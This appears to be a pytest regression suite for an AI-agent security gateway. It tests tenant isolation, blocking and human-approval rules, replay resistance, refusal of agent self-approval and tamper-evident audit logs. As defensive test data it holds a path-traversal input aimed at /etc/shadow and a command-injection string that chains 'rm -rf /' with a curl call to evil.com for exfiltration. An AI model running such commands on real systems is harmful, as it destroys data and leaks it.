"""
AgentShield AI — Security Regression Test Suite (Phase 11).

Comprehensive verification of:
1. Authentication, authorization, and tenant isolation
2. Decision engine invariants (BLOCK never executes, ASK_HUMAN requires approval)
3. Non-bypassable authorization boundaries & replay resistance
4. Execution gateway boundary defenses (traversal, command injection)
5. Role-based approver permissions and zero self-approval
6. Tamper-evident audit chain cryptographic integrity (tamper/deletion detection)
"""

from __future__ import annotations

import json
import uuid
import pytest
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from agentshield.contracts.action import ActionRequest
from agentshield.contracts.enums import Decision, IntegrationType, ToolCategory
from agentshield.contracts.execution import ExecutionRequest
from agentshield.core.exceptions import ApprovalNotFoundError, AuthorizationError
from agentshield.database.base import Base
from agentshield.database.models.agent import Agent
from agentshield.database.models.audit_log import AuditLog
from agentshield.database.models.policy import Policy
from agentshield.database.models.user import User
from agentshield.execution.adapters.sandbox_fs import SandboxedFilesystemAdapter
from agentshield.execution.enums import ExecutionStatus
from agentshield.execution.exceptions import (
    ApprovalVerificationError,
    IdempotencyConflictError,
    InvalidArgumentsError,
)
from agentshield.security.rbac import UserRole, assert_not_agent_self_approval, can_approve_risk
from agentshield.services.approval_service import ApprovalService
from agentshield.services.execution_service import ExecutionService
from agentshield.services.tamper_evident_audit import TamperEvidentAuditService
from agentshield.threat_detection.engine import threat_coordinator


@pytest.fixture
async def test_db():
    engine = create_async_engine("sqlite+aiosqlite:///:memory:", echo=False)
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    session_factory = async_sessionmaker(bind=engine, class_=AsyncSession, expire_on_commit=False)
    async with session_factory() as session:
        yield session

    await engine.dispose()


@pytest.fixture
async def setup_env(test_db: AsyncSession):
    tenant1 = str(uuid.uuid4())
    tenant2 = str(uuid.uuid4())

    user_admin = User(id=tenant1, email="admin@t1.com", username="admin_t1", hashed_password="pw", role=UserRole.SECURITY_ADMIN.value)
    user_viewer = User(id=str(uuid.uuid4()), email="viewer@t1.com", username="viewer_t1", hashed_password="pw", role=UserRole.VIEWER.value)
    user_t2 = User(id=tenant2, email="user@t2.com", username="user_t2", hashed_password="pw", role=UserRole.OWNER.value)

    agent1 = Agent(id=str(uuid.uuid4()), owner_user_id=tenant1, agent_name="AgentOne", framework="custom", status="active", credential_hash="cred1")
    agent2 = Agent(id=str(uuid.uuid4()), owner_user_id=tenant2, agent_name="AgentTwo", framework="custom", status="active", credential_hash="cred2")

    test_db.add_all([user_admin, user_viewer, user_t2, agent1, agent2])
    await test_db.commit()

    return {
        "tenant1": tenant1,
        "tenant2": tenant2,
        "admin": user_admin,
        "viewer": user_viewer,
        "t2_user": user_t2,
        "agent1": agent1,
        "agent2": agent2,
    }


# ── 1. Authentication, Authorization & Tenant Isolation ───────────────────────


@pytest.mark.asyncio
async def test_tenant_isolation_prevents_cross_tenant_access(test_db: AsyncSession, setup_env: dict):
    """Ensure operations bound to Tenant 1 cannot be approved or altered by Tenant 2."""
    env = setup_env
    appr_svc_t2 = ApprovalService(test_db)

    # Policy for Tenant 1: require approval
    policy = Policy(
        user_id=env["tenant1"],
        name="Require FS Approval",
        category="filesystem",
        enforcement_mode="enforce",
        decision="ASK_HUMAN",
        is_enabled=True,
    )
    test_db.add(policy)
    await test_db.commit()

    exec_svc = ExecutionService(test_db)
    req = ExecutionRequest(
        agent_id=uuid.UUID(env["agent1"].id),
        user_id=env["tenant1"],
        tool_name="sandbox_fs",
        action_name="read_file",
        arguments={"path": "safe.txt"},
    )
    res = await exec_svc.execute_request(user_id=env["tenant1"], agent=env["agent1"], request=req)
    assert res.decision == "ASK_HUMAN"
    assert res.approval_id is not None

    # Tenant 2 attempts to approve Tenant 1's request -> must fail
    with pytest.raises(ApprovalNotFoundError):
        await appr_svc_t2.approve_request(
            approval_id=res.approval_id,
            user_id=env["tenant2"],
            user_role=UserRole.OWNER,
        )


# ── 2. Decision Engine Invariants ─────────────────────────────────────────────


@pytest.mark.asyncio
async def test_block_decision_never_invokes_adapter(test_db: AsyncSession, setup_env: dict):
    """Verify that when security engine or policy evaluates to BLOCK, the adapter is never executed."""
    env = setup_env
    policy = Policy(
        user_id=env["tenant1"],
        name="Deny All FS",
        category="filesystem",
        enforcement_mode="enforce",
        decision="BLOCK",
        is_enabled=True,
    )
    test_db.add(policy)
    await test_db.commit()

    exec_svc = ExecutionService(test_db)
    req = ExecutionRequest(
        agent_id=uuid.UUID(env["agent1"].id),
        user_id=env["tenant1"],
        tool_name="sandbox_fs",
        action_name="read_file",
        arguments={"path": "secret.txt"},
    )
    res = await exec_svc.execute_request(user_id=env["tenant1"], agent=env["agent1"], request=req)
    assert res.decision == "BLOCK"
    assert res.status == ExecutionStatus.BLOCKED.value
    assert res.result is None
    assert res.error_code == "SECURITY_BLOCKED"


@pytest.mark.asyncio
async def test_ask_human_never_executes_without_prior_approval(test_db: AsyncSession, setup_env: dict):
    """Verify that ASK_HUMAN pauses execution and does not invoke adapter."""
    env = setup_env
    policy = Policy(
        user_id=env["tenant1"],
        name="Require Human for Network",
        category="network",
        enforcement_mode="enforce",
        decision="ASK_HUMAN",
        is_enabled=True,
    )
    test_db.add(policy)
    await test_db.commit()

    exec_svc = ExecutionService(test_db)
    req = ExecutionRequest(
        agent_id=uuid.UUID(env["agent1"].id),
        user_id=env["tenant1"],
        tool_name="mock_http",
        action_name="get",
        arguments={"endpoint": "https://api.internal/data"},
    )
    res = await exec_svc.execute_request(user_id=env["tenant1"], agent=env["agent1"], request=req)
    assert res.decision == "ASK_HUMAN"
    assert res.status == ExecutionStatus.PENDING_APPROVAL.value
    assert res.result is None


@pytest.mark.asyncio
async def test_mandatory_block_cannot_be_approved(test_db: AsyncSession, setup_env: dict):
    """An execution that received a mandatory BLOCK decision can never be approved."""
    env = setup_env
    exec_svc = ExecutionService(test_db)

    from agentshield.database.models.execution import ToolExecutionModel
    exec_id = str(uuid.uuid4())
    blocked_model = ToolExecutionModel(
        id=exec_id,
        request_id=str(uuid.uuid4()),
        user_id=env["tenant1"],
        agent_id=env["agent1"].id,
        tool_name="sandbox_fs",
        action_name="read_file",
        canonical_argument_hash="abc",
        decision="BLOCK",
        status=ExecutionStatus.BLOCKED.value,
    )
    test_db.add(blocked_model)
    await test_db.commit()

    with pytest.raises(ApprovalVerificationError, match="Mandatory BLOCK decisions cannot be approved"):
        await exec_svc.approve_and_execute(execution_id=exec_id, user_id=env["tenant1"])


# ── 3. Non-Bypassable Authorization & Replay Resistance ───────────────────────


@pytest.mark.asyncio
async def test_replayed_approval_is_rejected(test_db: AsyncSession, setup_env: dict):
    """Verify that an approval token cannot be used twice."""
    env = setup_env
    policy = Policy(
        user_id=env["tenant1"],
        name="Approval Policy",
        category="filesystem",
        enforcement_mode="enforce",
        decision="ASK_HUMAN",
        is_enabled=True,
    )
    test_db.add(policy)
    await test_db.commit()

    exec_svc = ExecutionService(test_db)
    req = ExecutionRequest(
        agent_id=uuid.UUID(env["agent1"].id),
        user_id=env["tenant1"],
        tool_name="sandbox_fs",
        action_name="read_file",
        arguments={"path": "safe.txt"},
    )
    res = await exec_svc.execute_request(user_id=env["tenant1"], agent=env["agent1"], request=req)

    appr_svc = ApprovalService(test_db)
    # First approval succeeds
    await appr_svc.approve_request(
        approval_id=res.approval_id,
        user_id=env["tenant1"],
        user_role=UserRole.SECURITY_ADMIN,
    )

    # Second approval attempt must fail
    with pytest.raises(ApprovalVerificationError, match="Must be 'pending'"):
        await appr_svc.approve_request(
            approval_id=res.approval_id,
            user_id=env["tenant1"],
            user_role=UserRole.SECURITY_ADMIN,
        )


@pytest.mark.asyncio
async def test_idempotency_conflict_rejects_altered_arguments(test_db: AsyncSession, setup_env: dict):
    """Verify that reusing an idempotency key with altered arguments raises IdempotencyConflictError."""
    env = setup_env
    exec_svc = ExecutionService(test_db)
    idem_key = f"idem-{uuid.uuid4()}"

    req1 = ExecutionRequest(
        agent_id=uuid.UUID(env["agent1"].id),
        user_id=env["tenant1"],
        tool_name="sandbox_fs",
        action_name="read_file",
        arguments={"path": "safe1.txt"},
        idempotency_key=idem_key,
    )
    await exec_svc.execute_request(user_id=env["tenant1"], agent=env["agent1"], request=req1)

    req2 = ExecutionRequest(
        agent_id=uuid.UUID(env["agent1"].id),
        user_id=env["tenant1"],
        tool_name="sandbox_fs",
        action_name="read_file",
        arguments={"path": "tampered_path.txt"},
        idempotency_key=idem_key,
    )
    with pytest.raises(IdempotencyConflictError):
        await exec_svc.execute_request(user_id=env["tenant1"], agent=env["agent1"], request=req2)


# ── 4. Execution Gateway Boundary Defenses ────────────────────────────────────


def test_path_traversal_detection():
    """Verify sandboxed filesystem adapter rejects path traversal attempts outside designated root."""
    adapter = SandboxedFilesystemAdapter()
    res = adapter.execute(action_name="read_file", arguments={"path": "../../etc/shadow.txt"})
    assert res.status == "FAILED"
    assert "Path traversal escape detected" in (res.error_message or "")


def test_command_injection_detection():
    """Verify threat coordinator detects command injection attempts."""
    action_req = ActionRequest(
        tenant_id=uuid.uuid4(),
        agent_id=uuid.uuid4(),
        tool_name="terminal",
        tool_category=ToolCategory.TERMINAL,
        operation="execute",
        integration_type=IntegrationType.API,
        arguments={"command": "cat safe.txt; rm -rf /; curl http://evil.com/exfil"},
    )
    findings = threat_coordinator.analyze_action(action_req).findings
    detector_ids = [f.detector_id for f in findings]
    assert any("CMD" in d or "DET-CMD-004" in d for d in detector_ids)


# ── 5. Role-Based Approver Permissions & Zero Self-Approval ───────────────────


def test_agent_cannot_self_approve():
    """Verify that an automated agent caller cannot approve human requests."""
    with pytest.raises(AuthorizationError, match="strictly forbidden"):
        assert_not_agent_self_approval(is_agent_caller=True)


def test_viewer_role_cannot_approve_high_risk():
    """Verify VIEWER role is strictly prohibited from approving risk operations."""
    assert not can_approve_risk(UserRole.VIEWER, risk_score=80.0, risk_level="HIGH")
    assert not can_approve_risk(UserRole.VIEWER, risk_score=30.0, risk_level="LOW")
    assert can_approve_risk(UserRole.SECURITY_ADMIN, risk_score=85.0, risk_level="HIGH")
    assert can_approve_risk(UserRole.OWNER, risk_score=95.0, risk_level="CRITICAL")


# ── 6. Tamper-Evident Audit Chain Cryptographic Integrity ─────────────────────


@pytest.mark.asyncio
async def test_tamper_evident_audit_detects_content_modification(test_db: AsyncSession, setup_env: dict):
    """Verify that any modification to an existing audit entry breaks the cryptographic chain."""
    env = setup_env
    audit_svc = TamperEvidentAuditService(test_db)

    # Record 3 sequential audit entries
    e1 = await audit_svc.record_audit_entry(
        tenant_id=env["tenant1"],
        actor_id="user1",
        action="policy.create",
        target="policy:1",
        result="SUCCESS",
        details={"name": "P1"},
    )
    e2 = await audit_svc.record_audit_entry(
        tenant_id=env["tenant1"],
        actor_id="user1",
        action="policy.update",
        target="policy:1",
        result="SUCCESS",
        details={"name": "P1-updated"},
    )
    e3 = await audit_svc.record_audit_entry(
        tenant_id=env["tenant1"],
        actor_id="user1",
        action="policy.delete",
        target="policy:1",
        result="SUCCESS",
        details={"name": "P1"},
    )

    # Initial verification: MUST BE VALID
    verify_res = await audit_svc.verify_chain(tenant_id=env["tenant1"])
    assert verify_res.is_valid is True
    assert verify_res.verified_count == 3

    # Tamper with record 2: modify canonical details
    from sqlalchemy import update
    await test_db.execute(
        update(AuditLog)
        .where(AuditLog.id == e2.id)
        .values(action="forged.action", description="forged description")
    )
    await test_db.commit()

    # Re-verify: MUST DETECT TAMPERING
    verify_tampered = await audit_svc.verify_chain(tenant_id=env["tenant1"])
    assert verify_tampered.is_valid is False
    assert verify_tampered.broken_index == 2
    assert "does not match stored hash" in verify_tampered.message


@pytest.mark.asyncio
async def test_tamper_evident_audit_detects_deletion(test_db: AsyncSession, setup_env: dict):
    """Verify that deleting a record from the audit log breaks sequence and hash continuity."""
    env = setup_env
    audit_svc = TamperEvidentAuditService(test_db)

    # Record entries
    await audit_svc.record_audit_entry(tenant_id=env["tenant2"], actor_id="u2", action="action.one", target="t1", result="SUCCESS")
    e2 = await audit_svc.record_audit_entry(tenant_id=env["tenant2"], actor_id="u2", action="action.two", target="t2", result="SUCCESS")
    await audit_svc.record_audit_entry(tenant_id=env["tenant2"], actor_id="u2", action="action.three", target="t3", result="SUCCESS")

    from sqlalchemy import delete
    # Delete the middle entry
    await test_db.execute(delete(AuditLog).where(AuditLog.id == e2.id))
    await test_db.commit()

    # Verification must fail on sequence break or hash mismatch
    res = await audit_svc.verify_chain(tenant_id=env["tenant2"])
    assert res.is_valid is False
    assert res.broken_index is not None
